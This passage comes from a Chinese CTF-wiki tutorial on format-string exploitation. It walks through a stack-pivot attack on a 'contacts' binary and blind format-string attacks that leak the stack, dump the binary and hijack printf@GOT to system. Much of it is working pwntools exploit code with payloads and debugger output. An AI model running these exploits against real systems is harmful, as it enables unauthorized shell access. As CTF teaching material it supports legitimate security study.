*   其次，不能够直接控制程序返回地址来控制程序流程的是因为我们并没有一块可以直接执行的地址来存储我们的内容，同时利用格式化字符串来往栈上直接写入 system_addr + ‘bbbb’ + addr of ‘/bin/sh‘ 似乎并不现实。

那么我们可以怎么做呢？我们还有之前在栈溢出讲的技巧，stack pivoting。而这里，我们可以控制的恰好是堆内存，所以我们可以把栈迁移到堆上去。这里我们通过 leave 指令来进行栈迁移，所以在迁移之前我们需要修改程序保存 ebp 的值为我们想要的值。 只有这样在执行 leave 指令的时候， esp 才会成为我们想要的值。同时，因为我们是使用格式化字符串来进行修改，所以我们得知道保存 ebp 的地址为多少，而这时 PrintInfo 函数中存储 ebp 的地址每次都在变化，而我们也无法通过其他方法得知。但是，**程序中压入栈中的 ebp 值其实保存的是上一个函数的保存 ebp 值的地址**，所以我们可以修改其**上层函数的保存的 ebp 的值，即上上层函数（即 main 函数）的 ebp 数值**。这样当上层程序返回时，即实现了将栈迁移到堆的操作。

基本思路如下

*   首先获取 system 函数的地址
    *   通过泄露某个 libc 函数的地址根据 libc database 确定。
*   构造基本联系人描述为 system_addr + ‘bbbb’ + binsh_addr
*   修改上层函数保存的 ebp(即上上层函数的 ebp) 为**存储 system_addr 的地址 -4**。
*   当主程序返回时，会有如下操作
    *   move esp,ebp，将 esp 指向 system_addr 的地址 - 4
    *   pop ebp， 将 esp 指向 system_addr
    *   ret，将 eip 指向 system_addr，从而获取 shell。

#### 获取相关地址与偏移

这里我们主要是获取 system 函数地址、/bin/sh 地址，栈上存储联系人描述的地址，以及 PrintInfo 函数的地址。

首先，我们根据栈上存储的 libc_start_main_ret 地址 (该地址是当 main 函数执行返回时会运行的函数) 来获取 system 函数地址、/bin/sh 地址。我们构造相应的联系人，然后选择输出联系人信息，并将断点下在 printf 处，并且一直运行到格式化字符串漏洞的 printf 函数处，如下

```
 → 0xf7e44670 <printf+0>       call   0xf7f1ab09 <__x86.get_pc_thunk.ax>
   ↳  0xf7f1ab09 <__x86.get_pc_thunk.ax+0> mov    eax, DWORD PTR [esp]
      0xf7f1ab0c <__x86.get_pc_thunk.ax+3> ret    
      0xf7f1ab0d <__x86.get_pc_thunk.dx+0> mov    edx, DWORD PTR [esp]
      0xf7f1ab10 <__x86.get_pc_thunk.dx+3> ret    
───────────────────────────────────────────────────────────────────────────────────────[ stack ]────
['0xffffccfc', 'l8']
8
0xffffccfc│+0x00: 0x08048c27  →   leave      ← $esp
0xffffcd00│+0x04: 0x0804c420  →  "1234567"
0xffffcd04│+0x08: 0x0804c410  →  "11111"
0xffffcd08│+0x0c: 0xf7e5acab  →  <puts+11> add ebx, 0x152355
0xffffcd0c│+0x10: 0x00000000
0xffffcd10│+0x14: 0xf7fad000  →  0x001b1db0
0xffffcd14│+0x18: 0xf7fad000  →  0x001b1db0
0xffffcd18│+0x1c: 0xffffcd48  →  0xffffcd78  →  0x00000000     ← $ebp
──────────────────────────────────────────────────────────────────────────────────────────[ trace ]────
[#0] 0xf7e44670 → Name: __printf(format=0x804c420 "1234567\n")
[#1] 0x8048c27 → leave 
[#2] 0x8048c99 → add DWORD PTR [ebp-0xc], 0x1
[#3] 0x80487a2 → jmp 0x80487b3
[#4] 0xf7e13637 → Name: __libc_start_main(main=0x80486bd, argc=0x1, argv=0xffffce14, init=0x8048df0, fini=0x8048e60, rtld_fini=0xf7fe88a0 <_dl_fini>, stack_end=0xffffce0c)
[#5] 0x80485e1 → hlt 
────────────────────────────────────────────────────────────────────────────────────────────────────
gef➤  dereference $esp 140
['$esp', '140']
1
0xffffccfc│+0x00: 0x08048c27  →   leave      ← $esp
gef➤  dereference $esp l140
['$esp', 'l140']
140
0xffffccfc│+0x00: 0x08048c27  →   leave      ← $esp
0xffffcd00│+0x04: 0x0804c420  →  "1234567"
0xffffcd04│+0x08: 0x0804c410  →  "11111"
0xffffcd08│+0x0c: 0xf7e5acab  →  <puts+11> add ebx, 0x152355
0xffffcd0c│+0x10: 0x00000000
0xffffcd10│+0x14: 0xf7fad000  →  0x001b1db0
0xffffcd14│+0x18: 0xf7fad000  →  0x001b1db0
0xffffcd18│+0x1c: 0xffffcd48  →  0xffffcd78  →  0x00000000     ← $ebp
0xffffcd1c│+0x20: 0x08048c99  →   add DWORD PTR [ebp-0xc], 0x1
0xffffcd20│+0x24: 0x0804b0a8  →  "11111"
0xffffcd24│+0x28: 0x00002b67 ("g+"?)
0xffffcd28│+0x2c: 0x0804c410  →  "11111"
0xffffcd2c│+0x30: 0x0804c420  →  "1234567"
0xffffcd30│+0x34: 0xf7fadd60  →  0xfbad2887
0xffffcd34│+0x38: 0x08048ed6  →  0x25007325 ("%s"?)
0xffffcd38│+0x3c: 0x0804b0a0  →  0x0804c420  →  "1234567"
0xffffcd3c│+0x40: 0x00000000
0xffffcd40│+0x44: 0xf7fad000  →  0x001b1db0
0xffffcd44│+0x48: 0x00000000
0xffffcd48│+0x4c: 0xffffcd78  →  0x00000000
0xffffcd4c│+0x50: 0x080487a2  →   jmp 0x80487b3
0xffffcd50│+0x54: 0x0804b0a0  →  0x0804c420  →  "1234567"
0xffffcd54│+0x58: 0xffffcd68  →  0x00000004
0xffffcd58│+0x5c: 0x00000050 ("P"?)
0xffffcd5c│+0x60: 0x00000000
0xffffcd60│+0x64: 0xf7fad3dc  →  0xf7fae1e0  →  0x00000000
0xffffcd64│+0x68: 0x08048288  →  0x00000082
0xffffcd68│+0x6c: 0x00000004
0xffffcd6c│+0x70: 0x0000000a
0xffffcd70│+0x74: 0xf7fad000  →  0x001b1db0
0xffffcd74│+0x78: 0xf7fad000  →  0x001b1db0
0xffffcd78│+0x7c: 0x00000000
0xffffcd7c│+0x80: 0xf7e13637  →  <__libc_start_main+247> add esp, 0x10
0xffffcd80│+0x84: 0x00000001
0xffffcd84│+0x88: 0xffffce14  →  0xffffd00d  →  "/mnt/hgfs/Hack/ctf/ctf-wiki/pwn/fmtstr/example/201[...]"
0xffffcd88│+0x8c: 0xffffce1c  →  0xffffd058  →  "XDG_SEAT_PATH=/org/freedesktop/DisplayManager/Seat[...]"

```

我们可以通过简单的判断可以得到

```
0xffffcd7c│+0x80: 0xf7e13637  →  <__libc_start_main+247> add esp, 0x10
```

存储的是__libc_start_main 的返回地址，同时利用 fmtarg 来获取对应的偏移，可以看出其偏移为 32，那么相对于格式化字符串的偏移为 31。

```
gef➤  fmtarg 0xffffcd7c
The index of format argument : 32

```

这样我们便可以得到对应的地址了。进而可以根据 libc-database 来获取对应的 libc，继而获取 system 函数地址与 /bin/sh 函数地址了。

其次，我们可以确定栈上存储格式化字符串的地址 0xffffcd2c 相对于格式化字符串的偏移为 11，得到这个是为了寻址堆中指定联系人的 Description 的内存首地址，我们将格式化字符串 [system_addr][bbbb][binsh_addr][%6$p][%11$p][bbbb] 保存在指定联系人的 Description 中。

再者，我们可以看出下面的地址保存着上层函数的调用地址，其相对于格式化字符串的偏移为 6，这样我们可以直接修改上层函数存储的 ebp 的值。

```
0xffffcd18│+0x1c: 0xffffcd48  →  0xffffcd78  →  0x00000000     ← $ebp
```

#### 构造联系人获取堆地址

得知上面的信息后，我们可以利用下面的方式获取堆地址与相应的 ebp 地址。

```
[system_addr][bbbb][binsh_addr][%6$p][%11$p][bbbb]
```

来获取对应的相应的地址。后面的 bbbb 是为了接受字符串方便。

这里因为函数调用时所申请的栈空间与释放的空间是一致的，所以我们得到的 ebp 地址并不会因为我们再次调用而改变。

在部分环境下，system 地址会出现 \ x00，导致 printf 的时候出现 0 截断导致无法泄露两个地址，因此可以将 payload 的修改如下：

```
[%6$p][%11$p][ccc][system_addr][bbbb][binsh_addr][dddd]
```

payload 修改为这样的话，还需要在 heap 上加入 12 的偏移。这样保证了 0 截断出现在泄露之后。

#### 修改 ebp

由于我们需要执行 move 指令将 ebp 赋给 esp，并还需要执行 pop ebp 才会执行 ret 指令，所以我们需要将 ebp 修改为存储 system 地址 -4 的值。这样 pop ebp 之后，esp 恰好指向保存 system 的地址，这时在执行 ret 指令即可执行 system 函数。

上面已经得知了我们希望修改的 ebp 值，而也知道了对应的偏移为 6，所以我们可以构造如下的 payload 来进行修改相应的值。

```
part1 = (heap_addr - 4) / 2
part2 = heap_addr - 4 - part1
payload = '%' + str(part1) + 'x%' + str(part2) + 'x%6$n'

```

#### 获取 shell

这时，执行完格式化字符串函数之后，退出到上上函数，我们输入 5，退出程序即会执行 ret 指令，就可以获取 shell。

#### 利用程序

```
from pwn import *
from LibcSearcher import *
contact = ELF('./contacts')
##context.log_level = 'debug'
if args['REMOTE']:
    sh = remote(11, 111)
else:
    sh = process('./contacts')
def createcontact(name, phone, descrip_len, description):
    sh.recvuntil('>>> ')
    sh.sendline('1')
    sh.recvuntil('Contact info: \n')
    sh.recvuntil('Name: ')
    sh.sendline(name)
    sh.recvuntil('You have 10 numbers\n')
    sh.sendline(phone)
    sh.recvuntil('Length of description: ')
    sh.sendline(descrip_len)
    sh.recvuntil('description:\n\t\t')
    sh.sendline(description)
def printcontact():
    sh.recvuntil('>>> ')
    sh.sendline('4')
    sh.recvuntil('Contacts:')
    sh.recvuntil('Description: ')
## get system addr & binsh_addr
payload = '%31$paaaa'
createcontact('1111', '1111', '111', payload)
printcontact()
libc_start_main_ret = int(sh.recvuntil('aaaa', drop=True), 16)
log.success('get libc_start_main_ret addr: ' + hex(libc_start_main_ret))
libc = LibcSearcher('__libc_start_main_ret', libc_start_main_ret)
libc_base = libc_start_main_ret - libc.dump('__libc_start_main_ret')
system_addr = libc_base + libc.dump('system')
binsh_addr = libc_base + libc.dump('str_bin_sh')
log.success('get system addr: ' + hex(system_addr))
log.success('get binsh addr: ' + hex(binsh_addr))
##gdb.attach(sh)
## get heap addr and ebp addr
payload = flat([
    system_addr,
    'bbbb',
    binsh_addr,
    '%6$p%11$pcccc',
])
createcontact('2222', '2222', '222', payload)
printcontact()
sh.recvuntil('Description: ')
data = sh.recvuntil('cccc', drop=True)
data = data.split('0x')
print data
ebp_addr = int(data[1], 16)
heap_addr = int(data[2], 16)
## modify ebp
part1 = (heap_addr - 4) / 2
part2 = heap_addr - 4 - part1
payload = '%' + str(part1) + 'x%' + str(part2) + 'x%6$n'
##print payload
createcontact('3333', '123456789', '300', payload)
printcontact()
sh.recvuntil('Description: ')
sh.recvuntil('Description: ')
##gdb.attach(sh)
print 'get shell'
sh.recvuntil('>>> ')
##get shell
sh.sendline('5')
sh.interactive()

```

system 出现 0 截断的情况下，exp 如下:

```
from pwn import *
context.log_level="debug"
context.arch="x86"
io=process("./contacts")
binary=ELF("contacts")
libc=binary.libc
def createcontact(io, name, phone, descrip_len, description):
    sh=io
    sh.recvuntil('>>> ')
    sh.sendline('1')
    sh.recvuntil('Contact info: \n')
    sh.recvuntil('Name: ')
    sh.sendline(name)
    sh.recvuntil('You have 10 numbers\n')
    sh.sendline(phone)
    sh.recvuntil('Length of description: ')
    sh.sendline(descrip_len)
    sh.recvuntil('description:\n\t\t')
    sh.sendline(description)
def printcontact(io):
    sh=io
    sh.recvuntil('>>> ')
    sh.sendline('4')
    sh.recvuntil('Contacts:')
    sh.recvuntil('Description: ')
#gdb.attach(io)
createcontact(io,"1","1","111","%31$paaaa")
printcontact(io)
libc_start_main = int(io.recvuntil('aaaa', drop=True), 16)-241
log.success('get libc_start_main addr: ' + hex(libc_start_main))
libc_base=libc_start_main-libc.symbols["__libc_start_main"]
system=libc_base+libc.symbols["system"]
binsh=libc_base+next(libc.search("/bin/sh"))
log.success("system: "+hex(system))
log.success("binsh: "+hex(binsh))
payload = '%6$p%11$pccc'+p32(system)+'bbbb'+p32(binsh)+"dddd"
createcontact(io,'2', '2', '111', payload)
printcontact(io)
io.recvuntil('Description: ')
data = io.recvuntil('ccc', drop=True)
data = data.split('0x')
print data
ebp_addr = int(data[1], 16)
heap_addr = int(data[2], 16)+12
log.success("ebp: "+hex(system))
log.success("heap: "+hex(heap_addr))
part1 = (heap_addr - 4) / 2
part2 = heap_addr - 4 - part1
payload = '%' + str(part1) + 'x%' + str(part2) + 'x%6$n'
#payload=fmtstr_payload(6,{ebp_addr:heap_addr})
##print payload
createcontact(io,'3333', '123456789', '300', payload)
printcontact(io)
io.recvuntil('Description: ')
io.recvuntil('Description: ')
##gdb.attach(sh)
log.success("get shell")
io.recvuntil('>>> ')
##get shell
io.sendline('5')
io.interactive()

```

需要注意的是，这样并不能稳定得到 shell，因为我们一次性输入了太长的字符串。但是我们又没有办法在前面控制所想要输入的地址。只能这样了。

为什么需要打印这么多呢？因为格式化字符串不在栈上，所以就算我们得到了需要更改的 ebp 的地址，也没有办法去把这个地址写到栈上，利用 $ 符号去定位他；因为没有办法定位，所以没有办法用 l\ll 等方式去写这个地址，所以只能打印很多。

格式化字符串盲打
--------

### 原理

所谓格式化字符串盲打指的是只给出可交互的 ip 地址与端口，不给出对应的 binary 文件来让我们进行 pwn，其实这个和 BROP 差不多，不过 BROP 利用的是栈溢出，而这里我们利用的是格式化字符串漏洞。一般来说，我们按照如下步骤进行

*   确定程序的位数
*   确定漏洞位置
*   利用

由于没找到比赛后给源码的题目，所以自己简单构造了两道题。

### 例子 1 - 泄露栈

源码和部署文件均放在了对应的文件夹 [fmt_blind_stack](https://github.com/ctf-wiki/ctf-challenges/tree/master/pwn/fmtstr/blind_fmt_stack) 中。

#### 确定程序位数

我们随便输入了 %p，程序回显如下信息

```
➜  blind_fmt_stack git:(master) ✗ nc localhost 9999
%p
0x7ffd4799beb0
G�flag is on the stack%                          

```

告诉我们 flag 在栈上，同时知道了该程序是 64 位的，而且应该有格式化字符串漏洞。

#### 利用

那我们就一点一点测试看看

```
from pwn import *
context.log_level = 'error'
def leak(payload):
    sh = remote('127.0.0.1', 9999)
    sh.sendline(payload)
    data = sh.recvuntil('\n', drop=True)
    if data.startswith('0x'):
        print p64(int(data, 16))
    sh.close()
i = 1
while 1:
    payload = '%{}$p'.format(i)
    leak(payload)
    i += 1

```

最后在输出中简单看了看，得到 flag

```
////////
////////
\x00\x00\x00\x00\x00\x00\x00\xff
flag{thi
s_is_fla
g}\x00\x00\x00\x00\x00\x00
\x00\x00\x00\x00\xfe\x7f\x00\x00

```

### 例子 2 - 盲打劫持 got

源码以及部署文件均已经在 [blind_fmt_got](https://github.com/ctf-wiki/ctf-challenges/tree/master/pwn/fmtstr/blind_fmt_got) 文件夹中。

#### 确定程序位数

通过简单地测试，我们发现这个程序是格式化字符串漏洞函数，并且程序为 64 位。

```
➜  blind_fmt_got git:(master) ✗ nc localhost 9999
%p
0x7fff3b9774c0

```

这次啥也没有回显，又试了试，发现也没啥情况，那我们就只好来泄露一波源程序了。

#### 确定偏移

在泄露程序之前，我们还是得确定一下格式化字符串的偏移，如下

```
➜  blind_fmt_got git:(master) ✗ nc localhost 9999
aaaaaaaa%p%p%p%p%p%p%p%p%p
aaaaaaaa0x7ffdbf920fb00x800x7f3fc9ccd2300x4006b00x7f3fc9fb0ab00x61616161616161610x70257025702570250x70257025702570250xa7025

```

据此，我们可以知道格式化字符串的起始地址偏移为 6。

#### 泄露 binary

由于程序是 64 位，所以我们从 0x400000 处开始泄露。一般来说有格式化字符串漏洞的盲打都是可以读入 ‘\x00’ 字符的，，不然没法泄露怎么玩，，除此之后，输出必然是 ‘\x00’ 截断的，这是因为格式化字符串漏洞利用的输出函数均是 ‘\x00’ 截断的。。所以我们可以利用如下的泄露代码。

```
##coding=utf8
from pwn import *
##context.log_level = 'debug'
ip = "127.0.0.1"
port = 9999
def leak(addr):
    # leak addr for three times
    num = 0
    while num < 3:
        try:
            print 'leak addr: ' + hex(addr)
            sh = remote(ip, port)
            payload = '%00008$s' + 'STARTEND' + p64(addr)
            # 说明有\n，出现新的一行
            if '\x0a' in payload:
                return None
            sh.sendline(payload)
            data = sh.recvuntil('STARTEND', drop=True)
            sh.close()
            return data
        except Exception:
            num += 1
            continue
    return None
def getbinary():
    addr = 0x400000
    f = open('binary', 'w')
    while addr < 0x401000:
        data = leak(addr)
        if data is None:
            f.write('\xff')
            addr += 1
        elif len(data) == 0:
            f.write('\x00')
            addr += 1
        else:
            f.write(data)
            addr += len(data)
    f.close()
getbinary()

```

需要注意的是，在 payload 中需要判断是否有 ‘\n’ 出现，因为这样会导致源程序只读取前面的内容，而没有办法泄露内存，所以需要跳过这样的地址。

#### 分析 binary

利用 IDA 打开泄露的 binary ，改变程序基地址，然后简单看看，可以基本确定源程序 main 函数的地址

```
seg000:00000000004005F6                 push    rbp
seg000:00000000004005F7                 mov     rbp, rsp
seg000:00000000004005FA                 add     rsp, 0FFFFFFFFFFFFFF80h
seg000:00000000004005FE
seg000:00000000004005FE loc_4005FE:                             ; CODE XREF: seg000:0000000000400639j
seg000:00000000004005FE                 lea     rax, [rbp-80h]
seg000:0000000000400602                 mov     edx, 80h ; '€'
seg000:0000000000400607                 mov     rsi, rax
seg000:000000000040060A                 mov     edi, 0
seg000:000000000040060F                 mov     eax, 0
seg000:0000000000400614                 call    sub_4004C0
seg000:0000000000400619                 lea     rax, [rbp-80h]
seg000:000000000040061D                 mov     rdi, rax
seg000:0000000000400620                 mov     eax, 0
seg000:0000000000400625                 call    sub_4004B0
seg000:000000000040062A                 mov     rax, cs:601048h
seg000:0000000000400631                 mov     rdi, rax
seg000:0000000000400634                 call    near ptr unk_4004E0
seg000:0000000000400639                 jmp     short loc_4005FE

```

可以基本确定的是 sub_4004C0 为 read 函数，因为读入函数一共有三个参数的话，基本就是 read 了。此外，下面调用的 sub_4004B0 应该就是输出函数了，再之后应该又调用了一个函数，此后又重新跳到读入函数处，那程序应该是一个 while 1 的循环，一直在执行。

#### 利用思路

分析完上面的之后，我们可以确定如下基本思路

*   泄露 printf 函数的地址，
*   获取对应 libc 以及 system 函数地址
*   修改 printf 地址为 system 函数地址
*   读入 /bin/sh; 以便于获取 shell

#### 利用程序

程序如下。

```
##coding=utf8
import math
from pwn import *
from LibcSearcher import LibcSearcher
##context.log_level = 'debug'
context.arch = 'amd64'
ip = "127.0.0.1"
port = 9999
def leak(addr):
    # leak addr for three times
    num = 0
    while num < 3:
        try:
            print 'leak addr: ' + hex(addr)
            sh = remote(ip, port)
            payload = '%00008$s' + 'STARTEND' + p64(addr)
            # 说明有\n，出现新的一行
            if '\x0a' in payload:
                return None
            sh.sendline(payload)
            data = sh.recvuntil('STARTEND', drop=True)
            sh.close()
            return data
        except Exception:
            num += 1
            continue
    return None
def getbinary():
    addr = 0x400000
    f = open('binary', 'w')
    while addr < 0x401000:
        data = leak(addr)
        if data is None:
            f.write('\xff')
            addr += 1
        elif len(data) == 0:
            f.write('\x00')
            addr += 1
        else:
            f.write(data)
            addr += len(data)
    f.close()
##getbinary()
read_got = 0x601020
printf_got = 0x601018
sh = remote(ip, port)
## let the read get resolved
sh.sendline('a')
sh.recv()
## get printf addr
payload = '%00008$s' + 'STARTEND' + p64(read_got)
sh.sendline(payload)
data = sh.recvuntil('STARTEND', drop=True).ljust(8, '\x00')
sh.recv()
read_addr = u64(data)
## get system addr
libc = LibcSearcher('read', read_addr)
libc_base = read_addr - libc.dump('read')
system_addr = libc_base + libc.dump('system')
log.success('system addr: ' + hex(system_addr))
log.success('read   addr: ' + hex(read_addr))
## modify printf_got
payload = fmtstr_payload(6, {printf_got: system_addr}, 0, write_size='short')
## get all the addr
addr = payload[:32]
payload = '%32d' + payload[32:]
offset = (int)(math.ceil(len(payload) / 8.0) + 1)
for i in range(6, 10):
    old = '%{}$'.format(i)
    new = '%{}$'.format(offset + i)
    payload = payload.replace(old, new)
remainer = len(payload) % 8
payload += (8 - remainer) * 'a'
payload += addr
sh.sendline(payload)
sh.recv()
## get shell
sh.sendline('/bin/sh;')
sh.interactive()

```

这里需要注意的是这一段代码

```
## modify printf_got
payload = fmtstr_payload(6, {printf_got: system_addr}, 0, write_size='short')
## get all the addr
addr = payload[:32]
payload = '%32d' + payload[32:]
offset = (int)(math.ceil(len(payload) / 8.0) + 1)
for i in range(6, 10):
    old = '%{}$'.format(i)
    new = '%{}$'.format(offset + i)
    payload = payload.replace(old, new)
remainer = len(payload) % 8
payload += (8 - remainer) * 'a'
payload += addr
sh.sendline(payload)
sh.recv()

```

fmtstr_payload 直接得到的 payload 会将地址放在前面，而这个会导致 printf 的时候 ‘\x00’ 截断（**关于这一问题，pwntools 目前正在开发 fmt_payload 的加强版，估计快开发出来了。**）。所以我使用了一些技巧将它放在后面了。主要的思想是，将地址放在后面 8 字节对齐的地方，并对 payload 中的偏移进行修改。需要注意的是

```
offset = (int)(math.ceil(len(payload) / 8.0) + 1)
```

这一行给出了修改后的地址在格式化字符串中的偏移，之所以是这样在于无论如何修改，由于 ‘%order$hn’ 中 order 多出来的字符都不会大于 8。具体的可以自行推导。

### 题目

*   SuCTF2018 - lock2 （主办方提供了 docker 镜像: suctf/2018-pwn-lock2）

这里推荐一个简单的工具 [LazyIDA](https://github.com/L4ys/LazyIDA)。基本的检测应该没有问题。

[img-0]:data:image/png;base64,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